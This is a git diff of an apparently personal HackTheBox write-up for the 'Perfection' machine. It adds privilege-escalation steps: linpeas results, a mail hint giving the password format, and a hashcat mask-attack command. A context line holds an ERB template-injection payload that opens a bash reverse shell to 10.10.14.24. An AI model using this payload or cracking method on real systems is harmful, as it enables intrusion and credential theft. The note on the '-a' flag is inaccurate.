@@ -1,4 +1,4 @@
-# Perfection
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/cbeae423-15f4-4b7d-962a-6fe855e95752)# Perfection
 > Write-up author: jon-brandy
 
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a25ccf1b-8041-48e5-9d09-020a945528ef)
@@ -7,6 +7,7 @@
 ## Lessons Learned:
 - Exploiting WEBrick 1.7.0
 - ERB and reverse shell using Ruby Code Execution.
+- Identify potential passwords using hashcat (based on password format).
 
 ## STEPS:
 > PORT SCANNING
@@ -169,6 +170,51 @@ pwn%0a<%25%3d+system("bash+-c+'exec+bash+-i+>%26+/dev/tcp/10.10.14.24/1337+0>%26
 23. The simplest privesc is to crack the susan password's hash. However **john** and **hashcat** failed to crack it.
 24. So I dropped linpeas to enumerate potential vuln that could lead to privesc.
 
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8d4734e0-37fe-4866-bb8c-7024ff50e240)
+
+
+25. Interesting, Susan seems not part of any group listed.
+26. After checking all the results, finally found what seems to be our interest.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1342053d-ac7f-4121-8814-9c3726b1af73)
+
+> Inside /var/mail/susan
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0aac48f5-7ee1-4f83-891a-35f963b7591f)
+
+
+27. GREAT! it's indeed our interest now.
+28. Since it shows the password pattern, then we can use hashcat to helps us crack it.
+
+```
+The password format:
+{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}
+
+9 integers between 1 - 1.000.000.000 --> 2 - 999.999.999
+
+RESULT:
+susan_nasus_?d?d?d?d?d?d?d?d?d
+```
+
+29. Let's use hashcat.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/340119a0-5482-4896-b085-923dbcd8aebd)
+
+
+30. Since it's identified as SHA-256 we can use **-m 1400**.
+
+```
+COMMAND:
+hashcat -m 1400 susan_hash.txt -a 3 susan_nasus_?d?d?d?d?d?d?d?d?d
+
+-m --> mode
+-a --> aggresiveness.
+```
+
+> RESULT
+
 
 
 ## IMPORTANT LINKS
@@ -178,4 +224,5 @@ https://security.snyk.io/package/rubygems/webrick
 https://portswigger.net/kb/issues/00100f00_ruby-code-injection
 https://www.stackhawk.com/blog/command-injection-ruby/
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby
+https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
 ```
